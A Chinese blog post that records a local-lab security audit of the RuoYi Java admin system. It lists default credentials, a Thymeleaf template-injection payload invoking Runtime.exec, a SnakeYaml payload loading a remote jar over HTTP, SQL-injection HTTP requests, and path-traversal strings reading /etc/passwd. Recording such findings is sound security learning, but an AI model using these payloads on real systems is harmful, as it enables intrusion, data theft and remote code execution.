+++
title = "RuoYi代码审计"
date = 2026-06-15T20:03:34+08:00
draft = false
description = "Java 代码审计"
tags = ["代码审计", "安全审计"]
categories = ["代码审计"]
series = ["代码审计"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++
# 1.环境搭建

## 1.漏洞复现环境
JDK >=1.8（推荐1.8版本）
IDEA 2023
若依后台管理系统v4,2
若依后台管理系统v4.5

## 2.参数修改

配置Maven

![Pasted image 20250319102213](/images/posts/ruoyi代码审计/pasted-image-20250319102213.png)


端口修改

![Pasted image 20250319101509](/images/posts/ruoyi代码审计/pasted-image-20250319101509.png)

数据库修改

![Pasted image 20250319101601](/images/posts/ruoyi代码审计/pasted-image-20250319101601.png)


导入数据库

![Pasted image 20250319102522](/images/posts/ruoyi代码审计/pasted-image-20250319102522.png)


![Pasted image 20250319102702](/images/posts/ruoyi代码审计/pasted-image-20250319102702.png)


![Pasted image 20250319102745](/images/posts/ruoyi代码审计/pasted-image-20250319102745.png)


## 3.启动

![Pasted image 20250319102934](/images/posts/ruoyi代码审计/pasted-image-20250319102934.png)

![Pasted image 20250319103014](/images/posts/ruoyi代码审计/pasted-image-20250319103014.png)


打开网页看一看  8081的发现访问成功

![Pasted image 20250319103050](/images/posts/ruoyi代码审计/pasted-image-20250319103050.png)


# 2.漏洞分析

## 1.弱口令

发现若依的弱口令会写在前端


![Pasted image 20250319103606](/images/posts/ruoyi代码审计/pasted-image-20250319103606.png)

不包括admin/admin123,若依还有其他的弱口令，以下是常见的若依账号密码集合


用户：admin ruoyi druid
密码：123456 admin druid admin123 admin888


其实若依的漏洞点多在后端，前端的话除了一个弱口令，和一个shiro框架，基本都在后端了


登录进来

![Pasted image 20250319111807](/images/posts/ruoyi代码审计/pasted-image-20250319111807.png)



## 2.指纹识别


随便抓一个包，像这一种的就是经典的ruoyi，remember me  

![Pasted image 20250319112339](/images/posts/ruoyi代码审计/pasted-image-20250319112339.png)


## 3.快速检测


使用若依综合利用工具


![Pasted image 20250319142242](/images/posts/ruoyi代码审计/pasted-image-20250319142242.png)


然后开始检测


![Pasted image 20250319142144](/images/posts/ruoyi代码审计/pasted-image-20250319142144.png)


发现存在上述漏洞

随便点开一个SQL报错漏洞  

![Pasted image 20250319142546](/images/posts/ruoyi代码审计/pasted-image-20250319142546.png)


![Pasted image 20250319142616](/images/posts/ruoyi代码审计/pasted-image-20250319142616.png)



## 4.Shiro反序列化漏洞

很奇怪这里漏洞检测应该也有shiro反序列化的漏洞的，应该是环境有点问题

默认shiro key  是在  源码中的这里，这里我没有设置key,但是以后遇见此框架可以直接去跟进ShiroConfig.java中去查看



![Pasted image 20250319143618](/images/posts/ruoyi代码审计/pasted-image-20250319143618.png)

![Pasted image 20250319143343](/images/posts/ruoyi代码审计/pasted-image-20250319143343.png)


填入发现爆破成功

![Pasted image 20250319143824](/images/posts/ruoyi代码审计/pasted-image-20250319143824.png)

检测一下  发现是cb链，tomcat利用回显


![Pasted image 20250319143904](/images/posts/ruoyi代码审计/pasted-image-20250319143904.png)


执行一下命令   ipconfig     本地测试，实战中可以做到任意文件读取的效果



![Pasted image 20250319144038](/images/posts/ruoyi代码审计/pasted-image-20250319144038.png)


## 5.Thymeleaf组件漏洞

漏洞影响 ：RuoYi <= v4.7.1

通过对应的代码审计我们可知  /demo/from/localrefresh/task存在漏洞



![Pasted image 20250319145627](/images/posts/ruoyi代码审计/pasted-image-20250319145627.png)


工具也有，但是不行 


所以我们要手动构造poc  

```
POST /demo/form/localrefresh/task

?fragment=header((${T (java.lang.Runtime).getRuntime().exec("calc")}))  //这里弹计算机

进行URL编码  
?fragment=header(
%28%24%7B%54%20%28%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%29%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%63%61%6C%63%22%29%7D%29)

```


进行发包，成功弹出计算机

![Pasted image 20250319151647](/images/posts/ruoyi代码审计/pasted-image-20250319151647.png)



## 6.Fastjson组件漏洞


这个一般在RuoYi  4.2上有漏洞，有点小麻烦，以后再复现





## 7.SnakeYaml组件漏洞

漏洞影响   《=4.6.2

漏洞利用

点击--》系统监控--》定时任务--》新增


调用目标字符串与con表达式插入我们的测试POC


准备工作    

下载地址：

https://github.com/artsploit/yaml-payload

![Pasted image 20250319153119](/images/posts/ruoyi代码审计/pasted-image-20250319153119.png)

下载并打开然后根据自己的要求进行修改

![Pasted image 20250319153538](/images/posts/ruoyi代码审计/pasted-image-20250319153538.png)


保存回到前面的文件

新建一个yaml-payload.yml 

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ['http://127.0.0.1/yaml-payload.jar']   //根据具体地址进行修改

]]
]


```


![Pasted image 20250319155710](/images/posts/ruoyi代码审计/pasted-image-20250319155710.png)

编译一下
![Pasted image 20250319155422](/images/posts/ruoyi代码审计/pasted-image-20250319155422.png)

继续 

![Pasted image 20250319160511](/images/posts/ruoyi代码审计/pasted-image-20250319160511.png)

可以发现已经编译出了这个东西

![Pasted image 20250319160606](/images/posts/ruoyi代码审计/pasted-image-20250319160606.png)


本地起一个服务，也可以部署在vps上

![Pasted image 20250319155900](/images/posts/ruoyi代码审计/pasted-image-20250319155900.png)



然后进入工具

![Pasted image 20250319161045](/images/posts/ruoyi代码审计/pasted-image-20250319161045.png)


但是发现报错了，但是思路是可以的

然后手工进行操作，点若依管理员当中


![Pasted image 20250319161504](/images/posts/ruoyi代码审计/pasted-image-20250319161504.png)


点击确定

![Pasted image 20250319161750](/images/posts/ruoyi代码审计/pasted-image-20250319161750.png)



然后启用该任务
执行成功是可以弹计算机的




## 8.SQL漏洞1


漏洞 《=4.6.2

在后台，拦截角色管理页面的请求包


然后进行修改  

Poc

```

POST /system/role/list HTTP/1.1
Host: 192.168.246.50:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.246.50:8081/index
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=5a82f4ee-c1e5-4135-9a19-0720debdc6ea
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 179

pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```

![Pasted image 20250319162322](/images/posts/ruoyi代码审计/pasted-image-20250319162322.png)


## 9.SQL漏洞2

角色编辑接口

poc 

```
POST /system/dept/edit HTTP/1.1
Host: 192.168.246.50:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.246.50:8081/index
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=5a82f4ee-c1e5-4135-9a19-0720debdc6ea
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 111

DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```

![Pasted image 20250319162952](/images/posts/ruoyi代码审计/pasted-image-20250319162952.png)



## 10.SQL漏洞3

poc

```
POST /system/role/export HTTP/1.1
Host: 192.168.246.50:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.246.50:8081/index
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=5a82f4ee-c1e5-4135-9a19-0720debdc6ea
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 75

params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```




![Pasted image 20250319163112](/images/posts/ruoyi代码审计/pasted-image-20250319163112.png)



## 11.任意文件下载（CNVD-2021-01931）


Poc

```
/common/download/resource?resource=/profile/../../../../etc/passwd
/common/download/resource?resource=/profile/../../../../Windows/win.ini
```




## 12.若依后台定时任务RCE


还不会，在学


## 13.监控信息泄露

![Pasted image 20250319165111](/images/posts/ruoyi代码审计/pasted-image-20250319165111.png)

比较重要的就是URL监控

![Pasted image 20250319165140](/images/posts/ruoyi代码审计/pasted-image-20250319165140.png)


## 14.Swagger敏感信息泄露


查看依赖包

![Pasted image 20250319164841](/images/posts/ruoyi代码审计/pasted-image-20250319164841.png)

![Pasted image 20250319164905](/images/posts/ruoyi代码审计/pasted-image-20250319164905.png)

![Pasted image 20250319165232](/images/posts/ruoyi代码审计/pasted-image-20250319165232.png)



这里有很多利用的路径方式，常见的路径利用方式有

/swagger-ui.html
/v2/api-docs
等等




![Pasted image 20250319165605](/images/posts/ruoyi代码审计/pasted-image-20250319165605.png)

